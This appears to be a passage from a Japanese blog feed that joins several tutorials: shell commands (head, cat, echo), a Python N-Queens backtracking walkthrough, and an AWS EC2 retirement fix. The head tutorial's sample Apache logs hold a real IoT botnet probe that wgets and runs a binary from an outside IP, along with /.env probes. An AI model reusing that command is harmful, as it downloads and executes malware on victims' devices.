/shell?cd+/tmp;rm+-rf+*;wget+ 185.245.96.227/bins/arm;chmod+777+/tmp/arm;sh+/tmp/arm+selfrep.jaws\u0026#34; 400 226 \u0026#34;-\u0026#34; \u0026#34;-\u0026#34; 61.136.101.77 - - [28/Nov/2021:03:15:39 +0900] \u0026#34;GET http://dushu.baidu.com HTTP/1.1\u0026#34; 302 208 \u0026#34;-\u0026#34; \u0026#34;-\u0026#34; 135.125.246.110 - - [28/Nov/2021:03:17:39 +0900] \u0026#34;POST / HTTP/1.1\u0026#34; 302 205 \u0026#34;-\u0026#34; \u0026#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\u0026#34; 135.125.246.110 - - [28/Nov/2021:03:17:39 +0900] \u0026#34;GET /.env HTTP/1.1\u0026#34; 302 209 \u0026#34;-\u0026#34; \u0026#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\u0026#34; 61.136.101.133 - - [28/Nov/2021:03:17:46 +0900] \u0026#34;GET http://dushu.baidu.com HTTP/1.1\u0026#34; 302 208 \u0026#34;-\u0026#34; \u0026#34;-\u0026#34; 164.90.204.15 - - [28/Nov/2021:03:20:54 +0900] \u0026#34;CONNECT www.yahoo.com:443 HTTP/1.1\u0026#34; 302 210 \u0026#34;-\u0026#34; \u0026#34;Go-http-client/1.1\u0026#34; suzuki$ それっぽいログが出るようになりました。\n次にどこからのアクセスが多いのかを絞り込みます。\nsuzuki$ sudo cat /var/log/httpd/access_log | grep -v \u0026#34;ELB-HealthChecker\u0026#34; | awk -F \u0026#39;\u0026#34;\u0026#39; \u0026#39;{ print $2; }\u0026#39; | head GET http://guba.eastmoney.com/list,hk01500_1.html HTTP/1.1 CONNECT guba.eastmoney.com:443 HTTP/1.1 GET http://guba.eastmoney.com/list,hk01500_1.html HTTP/1.1 CONNECT guba.eastmoney.com:443 HTTP/1.1 GET /shell?cd+/tmp;rm+-rf+*;wget+ 185.245.96.227/bins/arm;chmod+777+/tmp/arm;sh+/tmp/arm+selfrep.jaws GET http://dushu.baidu.com HTTP/1.1 POST / HTTP/1.1 GET /.env HTTP/1.1 GET http://dushu.baidu.com HTTP/1.1 CONNECT www.yahoo.com:443 HTTP/1.1 suzuki$ GETとPOSTの項目に絞り込まれました。\nawk コマンドの -F はセパレータで、この場合は \u0026lsquo;\u0026quot;\u0026rsquo; を区切り文字として２番目の値を出力するという意味になります。最後のheadは確認は出力の冒頭だけで十分なのでつけています。\n次は、GET, CONNECT, POSTなどのコマンドを除去します。\nawkコマンドのデフォルトのセパレーターは空白なので、空白区切りで数えると二つ目を表す $2 を使って絞り込みます。\nsuzuki$ sudo cat /var/log/httpd/access_log-20211205 | grep -v \u0026#34;ELB-HealthChecker\u0026#34; | awk -F \u0026#39;\u0026#34;\u0026#39; \u0026#39;{ print $2; }\u0026#39; | awk \u0026#39;{ print $2; }\u0026#39; | head http://guba.eastmoney.com/list,hk01500_1.html guba.eastmoney.com:443 http://guba.eastmoney.com/list,hk01500_1.html guba.eastmoney.com:443 /shell?cd+/tmp;rm+-rf+*;wget+ http://dushu.baidu.com / /.env http://dushu.baidu.com www.yahoo.com:443 suzuki$ 次に、余計な出力を抑制します。\nここでは空白行を出力したくないので grep -v ^$ を使っています。\n非常によく使うオプションなので覚えておくとよいです。\nヒント grep -v ^$ 空行を出力しない 行頭を表す「^」と行末を表す「$」の間に何もないですね。 では、同様にgrep -vで アスタリスクとスラッシュだけの行を絞り込みます。\nsuzuki$ sudo cat /var/log/httpd/access_log-20211205 | grep -v \u0026#34;ELB-HealthChecker\u0026#34; | awk -F \u0026#39;\u0026#34;\u0026#39; \u0026#39;{ print $2; }\u0026#39; | awk \u0026#39;{ print $2; }\u0026#39;| grep -v ^$ | grep -v [*/] |s ort| head 110.242.68.4:443 110.242.68.4:443 110.242.68.4:443 110.242.68.4:443 110.242.68.4:443 110.242.68.4:443 110.242.68.4:443 110.242.68.4:443 110.242.68.4:443 110.242.68.4:443 suzuki$ 最後に、出力をアルファベット順に並べ替えます。sortでよいです。\nさらに uniq コマンドで同じ複数のレコードを一つにするわけですが、 -c オプションを使うと、何件の複数のレコードを一つにまとめたのかを、行頭に示してくれます。\nそして sort -nr の -n は、行頭の数値、いわゆるuniq -c でまとめた件数を数値として並べ替えるという意味です。-r は、リバース、いわゆる逆順ソートですね。ここでは、件数の多いものから順番に出力します。headコマンドはデフォルトが１０検出力なので、head -n10 と書いてもよいですし、省略して head だけでもよいです。\nsuzuki$ sudo cat /var/log/httpd/access_log-20211205 | grep -v \u0026#34;ELB-HealthChecker\u0026#34; | awk -F \u0026#39;\u0026#34;\u0026#39; \u0026#39;{ print $2; }\u0026#39; | awk \u0026#39;{ print $2; }\u0026#39;|sort|uniq -c|sort -nr | head 850 http://dushu.baidu.com 839 /form.cgi 485 http://www.baidu.com/pub/css/new_font.css 477 / 265 * 258 guba.eastmoney.com:443 253 209 /.env 200 www.yahoo.com:443 184 istock.jrj.com.cn:443 suzuki$ ヒント :sudo cat filename | grep -v \u0026ldquo;除去したい文字列\u0026rdquo; | awk \u0026lsquo;{ print $2; }\u0026rsquo;| sort | uniq -c |sort -nr | head これはもはや定番中の定番です。覚えましょう。体に叩き込みましょう。 head コマンドの紹介の割には長くなりました。\n書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-02-10T10:23:14+09:00","image":"https://suzukiiichiro.github.io/posts/2022-02-10-01-head-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-02-10-01-head-suzuki/","title":"（３）【head】シェルスクリプトコマンド活用紹介"},{"content":"catコマンド ファイルの内容を表示する ファイルの内容を行番号付きで表示する 複数ファイルを連結して1つのファイルにする 概要 「cat」は、「conCATenate（つなぐ、連結する）」のcatです。ファイルを連結するためのコマンドですが、ファイルの内容を表示する際によく使われます。\n$ cat ＜ファイル名＞ catコマンドの書式 cat [オプション] ファイル1 ファイル2……\ncatコマンドの主なオプション catコマンドの主なオプションは次の通りです。\nオプション 長いオプション 意味 -n \u0026ndash;number 行番号を付け加える -b \u0026ndash;number-nonblank 行番号を付け加える。ただし空白行には付けない -s \u0026ndash;squeeze-blank 連続した空行を1行にする ヒント 一画面に収まらない長いファイルの場合は、lessコマンドを使うと便利です。 catコマンド詳細説明 ファイルの内容を出力 filenameの内容をターミナルに出力します。\n$ cat filename 長いファイルの場合は、lessコマンドを使います。\n$ cat filename | less ファイルの結合 複数のファイルを結合（連結）させて別ファイルへ出力します。\n$ cat filename1 filname2 \u0026gt; filename3 追記したい場合は「\u0026raquo;」を使います。\n$ cat filename1 filname2 \u0026gt;\u0026gt; filename3 ヒント 「\u0026gt;」をリダイレクト、「\u0026raquo;」をアペンドと言います。「\u0026gt;」はファイルを新規作成してファイルへ出力します。「\u0026raquo;」は既存のファイルへ追記出力します。 「\u0026gt;」は、内容があってもファイルの内容を空にして出力することに注意しなくてはなりません。 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-02-09T12:59:39+09:00","image":"https://suzukiiichiro.github.io/posts/2022-02-09-01-cat-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-02-09-01-cat-suzuki/","title":"（２）【cat】シェルスクリプトコマンド活用紹介"},{"content":"mainメソッド概要 今回は前回から引き続きバックトラックを説明していきたいと思います。\nプログラムソースは以下のURLにあります。\nhttps://github.com/suzukiiichiro/N-Queens/blob/master/03Python/py03_nqueen.py\n429-437行目でグローバル変数を宣言した後に呼び出されるのは486行目のmainメソッドです。\n467-484行目のmainメソッドの内容を見てみましょう。 nmin=4からMAX=15まで複数のNについて探索し、解の数と実行時間を出力します。\n以下が出力結果です。\nN: Total Unique hh:mm:ss.ms 4: 2 0 0:00:00.000 5: 10 0 0:00:00.000 6: 4 0 0:00:00.000 7: 40 0 0:00:00.001 8: 92 0 0:00:00.004 9: 352 0 0:00:00.019 10: 724 0 0:00:00.088 11: 2680 0 0:00:00.439 12: 14200 0 0:00:02.345 13: 73712 0 0:00:13.412 14: 365596 0 0:01:21.331 NがNQueenのN数、Totalが解の総数、Uniqueは左右反転ミラー、回転で同じ形のものを同一解として計算した場合の数、\nhh:mm:ss.msは各Nごとに処理にかかった時間です。\nUniqueは今回は全て0ですがロジックが進んでいくとまずUnique数を算出してそこからTotalを求めるようになりますので今の所は流しておいてください。\nエイトクイーン(N=8)の解の数は8: の92、実行時間は4msとなります。\nブルートフォースが3m7.321s、配置フラグが0m0.554sでしたから格段に高速になったことがわかると思います。\nmainメソッド詳細 メソッドの中身を見ていきましょう。\n459行目 nmin=4 でスタートするNの数を指定しています。\n461行目 for i in range(nmin,MAX): でnmin=4からMAX=15まで1ずつインクリメントしてnqueenを実行していきます。\n462,463行目でfor文の冒頭でTOTAL,UNIQUEを0で初期化しています。 これをしとかないと出力されるTotal,Uniqueの数が累計数になってしまいますので注意しましょう。\n464,465行目でABOARD配列を初期化しています。ABOARD配列は各行のどこにクイーンを置いたかを記憶するための配列です。ロジックが進んでいくと必須の配列になるのですが、今回のロジックでは使用しませんので読み飛ばしてください。\n467行目でnqueenメソッドを呼び出しています。\n今までは引数はrow=0の行情報1つだけでしたが、今回から複数のNについてNqueenを実行するようになるので第2引数にsizeが追加されています。\nsizeは461行目のfor i in range(nmin,MAX)のiで渡します。\n466行目,468-470行目でnqueenメソッドの前後時間を計測してメソッドの実行にかかった時間を算出しています。\ndatetime.now()で現在時刻が取得できます。\n466行目でstart_timeにnqueenメソッド呼び出し直前の時間を取得しておき、\n468行目でメソッド終了直後の現在時刻とstart_timeを引くことによってメソッドの実行にかかった時間をtime_elapsedとして算出しています。\n469行目で\u0026rsquo;{}\u0026rsquo;.format としていますがこれはtime_elapsedがdatetimeオブジェクトなのでstringにキャストしています。\nformat関数は、文字列中の{ }の場所に、引数をにstringキャストして埋め込むことができるみたいです。\n470行目で下３桁を切り捨てています。\nstringは配列の扱いなのでスライスできるみたいです\n[:-3]\nですと、0文字目から後ろから3文字除いた範囲を取り出しています。\n例えば以下のようになります。\n0:00:00.005309\n0:00:00.005\n基本的にformat関数は、文字列中の「{ }」の場所に、引数をstringにキャストして埋め込む\ntext = _text[:-3] スライス機能　先頭から末尾3文字を除いた文字列を切り取る\nnqueenメソッドについて プログラムの内容は基本的に前回の配置フラグと同じです。\n違うのは以下の2点です。\n1つ目は450,451,453行目です。\n前回は配置フラグとして上下の利き筋だけチェックするFAだけ使っていました。\n今回は、FAの他に左対角線の利き筋をチェックするFB、右対角線の利き筋をチェックするFCも使用しています。\n2つ目445行目です。\n前回までは最終行まで行ったらprintOutメソッドでCOUNT数と各行のクイーンの配置場所を出力していました。\n今回はTOTAL +=1 として正解数に1加算しています。\nFA,FB,FCの配置フラグのチェックを通過して最終行まで辿り着ければ正解としてカウントして良いと言えるからです。\n次回は図で説明しながら実際の動きを追ってみましょう。\n書籍の紹介 UNIXという考え方―その設計思想と哲学 単行本 – 2001/2/23 UNIX系のOSは世界で広く使われている。UNIX、Linux、FreeBSD、Solarisなど、商用、非商用を問わず最も普及したOSのひとつであろう。そしてこのOSは30年にわたって使用され続けているものでもある。なぜこれほど長い間使われてきたのか？ その秘密はUNIXに込められた数々の哲学や思想が握っている。 そもそもUNIXはMulticsという巨大なOSの開発から生まれたものだ。あまりに巨大なMulticsはその複雑さゆえに開発は遅々として進まず、その反省からケン・トンプソンが作ったのがUNIXの初めとされる。その後デニス・リッチーら多数の開発者が携わり、UNIXは発展した。本書はこのUNIXに込められた「思想と哲学」を抽出し、数々のエピソードとともにUNIXの特徴を浮き彫りにしていく。 たとえば本書で述べられているUNIXの発想のひとつとして「過度の対話式インタフェースを避ける」というものがある。UNIXのシステムは初心者には「不親切」なつくり、つまり親切な対話式のインタフェースはほとんどなく、ユーザーがコマンドを実行しようとするときはオプションをつける形をとっている。この形式はオプションをいちいち覚えねばならず、初心者に決してやさしくない。しかしこれはプログラムを小さく単純なものにし、他のプログラムとの結合性を高くする。そして結果としてUNIXのスケーラビリティと移植性の高さを支えることになっているのだ。このような形式で本書では9つの定理と10の小定理を掲げ、UNIXが何を重視し、何を犠牲にしてきたのかを明快に解説している。\n最終章にはMS-DOSなどほかのOSの思想も紹介されている。UNIXの思想が他のOSとどう違うかをはっきり知ることになるだろう。UNIXの本質を理解するうえで、UNIX信者もUNIX初心者にとっても有用な1冊だ。（斎藤牧人）\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-02-09T12:55:55+09:00","image":"https://suzukiiichiro.github.io/posts/2022-02-08-01-ani/chess_hub5f46a8b8fc9e255d0122f98accfe16c_94129_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-02-08-01-ani/","title":"第6回 pythonでNQueen（エイトクイーン）バックトラック（２）"},{"content":"echoコマンド メッセージや環境変数を表示します。 概要 「echo」はメッセージなどを表示するコマンドです。\n$echo メッセージ でメッセージを表示します。\n$ echo $変数名 で環境変数やシェルスクリプト内の変数を表示する際にも使用います。\nechoコマンドの書式 echo [オプション] メッセージ\nechoの主なオプション オプション 意味 -n 最後の改行を出力しない -e エスケープを解釈する -E エスケープを解釈しない（デフォルト） echo コマンド詳細説明 echoコマンドの使用：\nさまざまなオプションでechoコマンドを使用できます。\n次の例では、いくつかの便利なオプションについて説明します。\nオプションなしで「echo」コマンドを使用すると、デフォルトで改行が追加されます。\n\u0026lsquo;-n\u0026rsquo;オプションは、改行なしでテキストを印刷するために使用されます。\n\u0026lsquo;-e\u0026rsquo;オプションは、出力からバックスラッシュ文字を削除するために使用されます。\n\u0026rsquo;echo_example.sh\u0026rsquo;という名前の新しいbashファイルを作成し、次のスクリプトを追加します。\n#!/bin/bash echo \u0026#34;改行付きのテキストの印刷\u0026#34;; echo -n \u0026#34;改行なしのテキストの印刷\u0026#34;; echo -e \u0026#34;\\n削除\\tバックスラッシュ\\t文字\\n\u0026#34;; bashコマンドでファイルを実行します。\n$ bash echo_example.sh 改行付きのテキストの印刷 改行なしのテキストの印刷 削除\tバックスラッシュ\t文字 $ Hello World はじめてのbashコマンド「echo」\nターミナルで非常に単純なbashステートメントを実行します。 コマンドの出力は「Hello, World」になります。\n$ echo \u0026#34;Hello, World\u0026#34;; Hello, World $ はじめてのbashスクリプト「vim」\n$ vim HelloWorld.sh ＜空のvim HelloWorld.sh が開きます＞ vimで開いたHelloWorld.shを編集します。\n#!/bin/bash echo \u0026#34;Hello World\u0026#34;; ヒント echo の後ろに続く文字列は 「\u0026quot;\u0026quot;」（ダブるクォーテーション）または、「\u0026rsquo;\u0026rsquo;」（シングルクォーテーション）で囲みましょう。 行末の「;」（セミコロン）も忘れずに。 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-02-09T11:32:07+09:00","image":"https://suzukiiichiro.github.io/posts/2022-02-09-01-echo-suzki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-02-09-01-echo-suzki/","title":"（１）【echo】シェルスクリプトコマンド活用紹介"},{"content":"みなさんの中にもAWSのEC2を使った事がある人もいるかと思います。\nそのAWSからある日、下記のようなメールが届きました。\nHello,\nEC2 has detected degradation of the underlying hardware hosting your Amazon EC2 instance (instance-ID: [インスタンスのID]) associated with your AWS account (AWS Account ID: [ID]) in the [リージョンの場所] region.\nDue to this degradation your instance could already be unreachable.\nWe will stop your instance after 日付 UTC.\nPlease take appropriate action before this time.\nThe affected instances are listed below:\n[インスタンスのID]\n翻訳してみると、どうやらAWSの老朽化に伴うインスタンスの更新が必要なようです。\nこんにちは。\nEC2は、[リージョンの場所]リージョンにあるお客様のAWSアカウント（AWSアカウントID：[ID]）に関連するAmazon EC2インスタンス（インスタンスID：Instance-ID）をホストする基礎ハードウェアの劣化を検出しました。\nこの劣化により、お客様のインスタンスはすでに到達不能になっている可能性があります。日付 UTC以降にお客様のインスタンスを停止します。\nそれまでに適切な対処をお願いいたします。\n影響を受けるインスタンスは以下の通りです。\n[インスタンスのID]\n老朽化の通知をしてくれるのは非常にありがたいですが、EC2の適切な対処ってなんだ？と焦ってしまう方もいるかと思います。\n今回は「Amazon EC2 Instance Retirement」というタイトルのメールが来た際の対処法について説明いたします。\nEC2のイベントを確認 まずはAWSにログインして、EC2の項目に移動します。\n左袖に、「イベント」という項目があるので、クリックして内容を確認しましょう。\n今回は「イベントステータス」部分に「Scheduled」と記述され、「イベントタイプ」が「instance-stop」となっている項目がありました。\nリソースIDをAWSのメールと照らし合わせて、該当のインスタンスということがわかります。\n「説明」の部分にも見切れていますが、「The instance is running on degraded hardware（インスタンスが劣化したハードウェアで動作している）」と記述されていました。\n進行状況から14日以内にインスタンスが停止してしまうので、「Amazon EC2 Instance Retirement」というメールが来たら、早めにAWSへログインして状況を確認するようにしましょう。\nEC2のルートを確認 次に、該当のインスタンスのルートデバイスタイプを確認します。\n前回のリソースID部分をクリックして、「インスタンスの概要」へ移動します。そして、「ストレージ」をクリックして「ルートデバイスタイプ」を確認しましょう。\nこの部分が「EBS」となっている場合は、対応が非常に簡単です。\nその対応を方法は次のようになります。\nEC2を停止、そして起動 「Amazon EC2 Instance Retirement」の対応はルートデバイスがEBSの場合は、対象のインスタンスを一度「インスタンスを停止」させてから「インスタンスを開始」するだけで対応できてしまいます。\n「インスタンスを停止」して「インスタンスを開始」だから、要するに「インスタンスを再起動」ってことでしょ？と考えてしまうかもしれません。\nしかし、「インスタンスを再起動」の場合はEC2のハードウェアが変わらないため、今回のハードウェアのアップデートが行われません。\nですので、「インスタンスを停止」させてから「インスタンスを開始」するようにして、EC2を実行するハードウェアをAWS側が自動的に変更するようにしましょう。\nルートデバイスタイプが「instant store」の場合 ルートデバイスが「instant store」の場合はEBSと対応が変わります。 まず、EC2インスタンスからイメージを作成します。 次に、さきほど作成したイメージを利用し、別のEC2インスタンスを立ち上げます。 そして、元のEC2インスタンスを削除します まとめ 「Amazon EC2 Instance 